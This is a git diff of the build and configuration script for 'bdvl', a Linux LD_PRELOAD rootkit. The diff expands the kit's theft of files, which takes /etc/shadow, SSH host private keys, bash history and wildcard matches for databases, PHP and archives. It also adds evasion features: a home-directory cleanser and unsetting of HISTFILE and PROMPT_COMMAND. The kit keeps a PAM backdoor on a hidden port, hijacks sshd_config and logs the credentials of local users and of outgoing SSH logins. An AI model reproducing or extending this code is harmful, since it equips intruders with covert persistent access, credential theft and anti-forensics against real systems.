@@ -10,28 +10,40 @@ PAM_PORT = None
 
 
 PATCH_SSHD_CONFIG = True # makes sure the PAM backdoor stays accessible by hijacking sshd_config.
-ROOTKIT_BASHRC    = True # the rootkit will write & maintain the bashrc so it stays the way it should.
-                         # as opposed to just copying it to the installation once before installation.
 
 READ_GID_FROM_FILE = True   # magic GID value is determined by the contents of a file.
 AUTO_GID_CHANGER   = True   # change gid at least every `GID_CHANGE_MINTIME` seconds. (30 min)
 GID_CHANGE_MINTIME = 60 * 30
-HIDE_MY_ASS = True  # keep track of hidden things outside the installation directory. for rehiding upon GID change.
+HIDE_MY_ASS      = True     # keep track of hidden things outside of the rootkit's directories. for rehiding upon a GID change.
+CLEANSE_HOMEDIR  = True     # remove .bashrc, .profile & symlinks when no rootkit processes are up.
 
-LOG_LOCAL_AUTH = True # log successful auths for users on the box.
-LOG_SSH = True # log outgoing ssh login attempts.
+LOG_LOCAL_AUTH = True   # log successful auths for users on the box.
+LOG_SSH        = True   # log outgoing ssh login attempts.
 
 # "steal" files that may be of interest. they will be updated if there are changes in size.
+# wildcards for filenames work too..the files are stolen in the user's process so we're not modifying access times.
 FILE_STEAL = True
-INTERESTING_FILES = ["passwd", "shadow", "sshd_config", "ssh_config", "ssh_host_dsa_key",
-                     "ssh_host_dsa_key.pub", "ssh_host_ecdsa_key", "ssh_host_ecdsa_key.pub",
-                     "ssh_host_ed25519_key", "ssh_host_ed25519_key.pub", "ssh_host_rsa_key",
-                     "ssh_host_rsa_key.pub", "apache.log", "known_hosts", ".bash_history"]
+MAX_FILE_SIZE      = (1024 * 1024) * 5   # don't try to steal files bigger than 5mb. set to None to disable limit. keep in mind memory is allocated for the target file.
+CLEAN_STOLEN_FILES = True                # remove stolen files every `FILE_CLEANSE_TIMER` seconds.
+FILE_CLEANSE_TIMER = (60 * 60) * 24      # remove stolen files once each day. you may want to change this depending on frequently you think files will be stolen & how big you think they could be.
+INTERESTING_FILES  = ['passwd',                     'shadow',                 'sshd_config',
+                      'ssh_config',                 'ssh_host_dsa_key',       'ssh_host_dsa_key.pub',
+                      'ssh_host_ecdsa_key',         'ssh_host_ecdsa_key.pub', 'ssh_host_ed25519_key',
+                      'ssh_host_ed25519_key.pub',   'ssh_host_rsa_key',       'ssh_host_rsa_key.pub',
+                      'apache.log', 'known_hosts',  '.bash_history',
+                      '*.txt', '*.sql',   '*.php', '*.zip',
+                      '*.tar', '*.tar.*', '*.rar', '*.db']
 
 USE_CRYPT = True
 
 
 # END OF SETTINGS
+
+
+# other random stuff
+
+# bdvl will unset these environment variables in its processes.
+unsetvars = ['HISTFILE', 'SAVEHIST', 'TMOUT', 'PROMPT_COMMAND']
 
 
 
@@ -133,9 +145,9 @@ class Definitions():
 
 # handy class. trusty class. thank you class.
 class CArray(): # default is assumed to be an array of char pointers
-    def __init__(self, name, sizedef, alist, arrtype='charp'):
+    def __init__(self, name, alist, arrtype='charp'):
         self.array_name = name
-        self.size_name = sizedef
+        self.size_name = name.upper() + '_SIZE'
         self.list_len = len(alist)
         self.array_list = alist
         self.arrtype = arrtype
@@ -201,8 +213,13 @@ print('Hidden port: ' + str(PAM_PORT))
 MAGIC_GID = choice(range(22222222, 66666666))
 
 INSTALL_DIR = ut.randpath(7)
+HOMEDIR = ut.randpath(7)
 BDVLSO = 'lib' + basename(INSTALL_DIR) + '.so'
 SOPATH = '{0}/{1}.$PLATFORM'.format(INSTALL_DIR, BDVLSO)
+
+CLEANEDTIME_PATH = ut.randpath(7)
+if CLEAN_STOLEN_FILES == False or FILE_CLEANSE_TIMER == None:
+    CLEANEDTIME_PATH = None
 
 INC      = 'inc'
 NEW_INC  = 'new_inc'
@@ -214,27 +231,59 @@ BDVLH = NEW_INC + '/bedevil.h'
 SETTINGS = { # all of these are written to bedevil.h
     'BD_UNAME':BD_UNAME,                  'BD_PWD':ut.cryptpw(BD_PWD),
     'MAGIC_GID':int(MAGIC_GID),           'BD_VAR':ut.randgarb(ascii_uppercase, 9),
-    'INSTALL_DIR':INSTALL_DIR,            'BDVLSO':BDVLSO,
-    'SOPATH':SOPATH,                      'PRELOAD_FILE':ut.randpath(10),
-    'SSH_LOGS':ut.randpath(7),            'INTEREST_DIR':ut.randpath(7),
-    'HIDEPORTS':ut.randpath(7),           'GID_PATH':ut.randpath(5),
-    'GIDTIME_PATH':ut.randpath(5),        'PAM_PORT':int(PAM_PORT),
-    'SSHD_CONFIG':'/etc/ssh/sshd_config', 'BASHRC_PATH':INSTALL_DIR+'/.bashrc'
+    'INSTALL_DIR':INSTALL_DIR,            'HOMEDIR':HOMEDIR,
+    'BDVLSO':BDVLSO,                      'SOPATH':SOPATH,
+    'PRELOAD_FILE':ut.randpath(10),       'SSH_LOGS':ut.randpath(7),
+    'INTEREST_DIR':ut.randpath(7),        'HIDEPORTS':ut.randpath(7),
+    'GID_PATH':ut.randpath(5),            'GIDTIME_PATH':ut.randpath(5),
+    'PAM_PORT':int(PAM_PORT),             'SSHD_CONFIG':'/etc/ssh/sshd_config',
+    'LOG_PATH':ut.randpath(7),            'ASS_PATH':ut.randpath(7),
+    'MAX_FILE_SIZE':MAX_FILE_SIZE,        'BASHRC_PATH':HOMEDIR+'/.bashrc',
+    'PROFILE_PATH':HOMEDIR+'/.profile',   'FILE_CLEANSE_TIMER':FILE_CLEANSE_TIMER,
+    'CLEANEDTIME_PATH':CLEANEDTIME_PATH
 }
 
-LINKPATHS = { # the following paths are linked to within the installation directory.
+# the following paths are linked to within the installation directory.
+# & removed when we aren't logged into the box.
+LINKPATHS = {
     SETTINGS['SSH_LOGS']:'ssh_logs',         SETTINGS['HIDEPORTS']:'hide_ports',
-    SETTINGS['INTEREST_DIR']:'interest_dir'
+    SETTINGS['INTEREST_DIR']:'interest_dir', SETTINGS['LOG_PATH']:'auth_logs',
+    SETTINGS['ASS_PATH']:'my_ass',           SETTINGS['INSTALL_DIR']:'install_dir'
 }
 
 # these must be checked & based on the values, subsequently written to config.h
 # so that the kit knows what stuff to do & what not to do.
 CHECKTHESE = {
-        'PATCH_SSHD_CONFIG':PATCH_SSHD_CONFIG,   'ROOTKIT_BASHRC':ROOTKIT_BASHRC,
-        'READ_GID_FROM_FILE':READ_GID_FROM_FILE, 'AUTO_GID_CHANGER':AUTO_GID_CHANGER,
-        'GID_CHANGE_MINTIME':GID_CHANGE_MINTIME, 'HIDE_MY_ASS':HIDE_MY_ASS,
-        'LOG_LOCAL_AUTH':LOG_LOCAL_AUTH,         'LOG_SSH':LOG_SSH,
-        'FILE_STEAL':FILE_STEAL,                 'USE_CRYPT':USE_CRYPT
+    'PATCH_SSHD_CONFIG':PATCH_SSHD_CONFIG,   'READ_GID_FROM_FILE':READ_GID_FROM_FILE,
+    'AUTO_GID_CHANGER':AUTO_GID_CHANGER,     'GID_CHANGE_MINTIME':GID_CHANGE_MINTIME,
+    'HIDE_MY_ASS':HIDE_MY_ASS,               'LOG_LOCAL_AUTH':LOG_LOCAL_AUTH,
+    'LOG_SSH':LOG_SSH,                       'FILE_STEAL':FILE_STEAL,
+    'USE_CRYPT':USE_CRYPT,                   'CLEANSE_HOMEDIR':CLEANSE_HOMEDIR,
+    'CLEAN_STOLEN_FILES':CLEAN_STOLEN_FILES
+}
+
+TOGGLE_PATHS = {  # there are paths that go along with said toggles. they're needed.
+    SETTINGS['SSH_LOGS']:LOG_SSH,
+    SETTINGS['GID_PATH']:READ_GID_FROM_FILE,
+    SETTINGS['GIDTIME_PATH']:AUTO_GID_CHANGER,
+    SETTINGS['LOG_PATH']:LOG_LOCAL_AUTH,
+    SETTINGS['ASS_PATH']:HIDE_MY_ASS,
+    SETTINGS['INTEREST_DIR']:FILE_STEAL,
+    SETTINGS['CLEANEDTIME_PATH']:CLEANEDTIME_PATH
+}
+
+NOTRACK = {  # stuff that HIDE_MY_ASS does not need to track.
+    '/proc':True,
+    SETTINGS['GID_PATH']:READ_GID_FROM_FILE,
+    SETTINGS['INSTALL_DIR']:True,
+    SETTINGS['PRELOAD_FILE']:True,
+    SETTINGS['GIDTIME_PATH']:AUTO_GID_CHANGER,
+    SETTINGS['HIDEPORTS']:True,
+    SETTINGS['SSH_LOGS']:LOG_SSH,
+    SETTINGS['INTEREST_DIR']:FILE_STEAL,
+    SETTINGS['HOMEDIR']:True,
+    SETTINGS['ASS_PATH']:True,
+    SETTINGS['CLEANEDTIME_PATH']:True
 }
 
 # read the list of hooked function names from libdl directory &
@@ -266,8 +315,7 @@ def gethooks():
             ALL_HOOKS.append(curhook)
 
         # create the C array for the current target lib & the hooked functions
-        cursizedef = targetlib.upper() + '_SIZE'
-        newarr = CArray(targetlib, cursizedef, hooktoks)
+        newarr = CArray(targetlib, hooktoks)
         allhooks += newarr.create()
 
     return allhooks
@@ -275,9 +323,10 @@ def gethooks():
 
 def setupcfg():
     # these are settings that auto.sh must be able to read & use to install the kit.
-    targets = ['MAGIC_GID', 'INSTALL_DIR', 'PRELOAD_FILE', 'BDVLSO',
+    targets = ['MAGIC_GID', 'INSTALL_DIR', 'HOMEDIR', 'PRELOAD_FILE', 'BDVLSO',
                'SOPATH', 'HIDEPORTS', 'SSH_LOGS', 'INTEREST_DIR',
-               'BD_VAR', 'GID_PATH', 'GIDTIME_PATH']
+               'BD_VAR', 'GID_PATH', 'GIDTIME_PATH', 'LOG_PATH',
+               'ASS_PATH']
 
     fd = open(SETTINGS_CFG, 'w')
     fd.write('\n'.join(str(SETTINGS[target]) for target in targets))
@@ -299,9 +348,19 @@ def hexarraylifypath(path, arrname, sizedef):
 
     contentshex = hexlify(contents)
     contentslist = ['0x' + contentshex[i:i+2] for i in range(0, len(contentshex), 2)]
-    contentsarr = CArray(arrname, sizedef, contentslist, arrtype='char')
+    contentsarr = CArray(arrname, contentslist, arrtype='char')
     return contentsarr.create()
 
+def listconditional(dictlist):
+    keys   = list(dictlist.keys())
+    values = list(dictlist.values())
+
+    goodkeys = []
+    for i in range(len(keys)):
+        if values[i] == False:
+            continue
+        goodkeys.append(keys[i])
+    return goodkeys
 
 def setup_config():
     copytree(INC, NEW_INC)
@@ -326,6 +385,17 @@ def setup_config():
         target = KEYS[settingi]
         value = VALUES[settingi]
 
+        skip = False
+        togpathkeys = list(TOGGLE_PATHS.keys())
+        togpathvals = list(TOGGLE_PATHS.values())
+        for key in togpathkeys:
+            if value == key and TOGGLE_PATHS[key] == False:
+                skip = True
+                break
+
+        if value == None or skip == True:
+            continue
+
         # if the target setting is a port, add it into the hideports file.
         targettok = target.split('_')
         if 'PORT' in targettok:
@@ -338,45 +408,56 @@ def setup_config():
         except:
             gotbdvlh += '#define {0} {1}\n'.format(target, str(value))
 
-    if HIDE_MY_ASS == True:
-        gotbdvlh += '#define ASS_PATH INSTALL_DIR\"/my_ass\"\n'
-
     defs = Definitions(ALL_HOOKS)
     gotbdvlh += defs.getidents()
 
-    allhookssiz = 'ALL_SIZE'
-    allhooksarr = CArray('all', allhookssiz, ALL_HOOKS)
+    allhooksarr = CArray('all', ALL_HOOKS)
     gotbdvlh += allhooksarr.create()
-    gotbdvlh += 'syms symbols[{0}];\n'.format(allhookssiz)
+    gotbdvlh += 'syms symbols[ALL_SIZE];\n'
 
     fd = open('etc/.rolf', 'r')
     rolf = fd.read().strip().split('\n')
     fd.close()
-    rolfarr = CArray('rolfs', 'ROLFS_SIZE', rolf)
+    rolfarr = CArray('rolfs', rolf)
     gotbdvlh += rolfarr.create()
 
     if FILE_STEAL == True:
-        bashrcarr = CArray('interesting_files', 'INTERESTING_FILES_SIZE', INTERESTING_FILES)
+        bashrcarr = CArray('interesting_files', INTERESTING_FILES)
         gotbdvlh += bashrcarr.create()
 
-    alllinkpaths = []
+    alllinksrcs = []
     KEYS = list(LINKPATHS.keys())
     VALUES = list(LINKPATHS.values())
     for i in range(len(KEYS)):
-        thislinkpath = '{0}:{1}'.format(KEYS[i], INSTALL_DIR+'/'+VALUES[i])
-        alllinkpaths.append(thislinkpath)
+        thislinkpath = '{0}:{1}'.format(KEYS[i], SETTINGS['HOMEDIR']+'/'+VALUES[i])
+        alllinksrcs.append(thislinkpath)
 
-    linkpathsarr = CArray('linkpaths', 'LINKPATHS_SIZE', alllinkpaths)
-    gotbdvlh += linkpathsarr.create()
+    linksrc  = []
+    linkdest = []
+    for link in alllinksrcs:
+        link = link.split(':')
+        linksrc.append(link[0])
+        linkdest.append(link[1])
+    linksrcs = CArray('linksrcs', linksrc)
+    linkdests = CArray('linkdests', linkdest)
+    gotbdvlh += linksrcs.create() + linkdests.create()
+
+    #unset_variables
+    arrunsetvars = CArray('unsetvars', unsetvars)
+    gotbdvlh += arrunsetvars.create()
+
+    togpathslist = listconditional(TOGGLE_PATHS)
+    arrtogpaths = CArray('togpaths', togpathslist)
+    gotbdvlh += arrtogpaths.create()
+
+    notracklist = listconditional(NOTRACK)
+    arrnotrack = CArray('notrack', notracklist)
+    gotbdvlh += arrnotrack.create()
 
     # bedevil.h complete. write it.
     fd = open(BDVLH, 'w')
     fd.write(gotbdvlh)
     fd.close()
-
-    # backdoor shell stuff...
-    if ROOTKIT_BASHRC == False:
-        copy('etc/.bashrc', NEW_INC+'/.bashrc')
 
     # write all the settings auto.sh needs.
     setupcfg()
